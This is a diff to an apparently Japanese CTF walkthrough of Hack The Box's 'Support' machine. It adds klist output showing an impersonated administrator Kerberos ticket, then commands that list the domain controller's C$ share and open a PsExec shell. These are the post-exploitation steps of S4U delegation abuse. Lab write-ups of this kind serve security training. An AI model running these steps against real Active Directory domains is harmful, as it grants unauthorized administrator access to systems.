@@ -245,7 +245,34 @@ Cached Tickets: (0)
 [+] Ticket successfully imported!
 ```
 
-finally we can use Rubeus' *s4u* module to get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:
+このタイミングで`klist`コマンドを実行すると
+```
+*Evil-WinRM* PS C:\Users\support> klist
+
+Current LogonId is 0:0x13358d
+
+Cached Tickets: (1)
+
+#0>	Client: administrator @ SUPPORT.HTB
+	Server: cifs/dc.support.htb @ SUPPORT.HTB
+	KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+	Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
+	Start Time: 10/9/2022 23:31:53 (local)
+	End Time:   10/10/2022 9:31:53 (local)
+	Renew Time: 10/16/2022 23:31:53 (local)
+	Session Key Type: AES-128-CTS-HMAC-SHA1-96
+	Cache Flags: 0
+	Kdc Called:
+```
+
+これにより、dc.support.htbにアクセスできる。
+```
+*Evil-WinRM* PS C:\Users\support> ls \\dc.support.htb\C$
+*Evil-WinRM* PS C:\Users\support> .\PsExec.exe -accepteula \\dc.support.htb cmd
+```
+
+うまく行かない場合は、[Suportのwalkthrough](https://github.com/MASAbirokou/HTB_ADbox_walkthrough/blob/main/Support.md)にあるようにKali上で実行する。
+
 
 
 
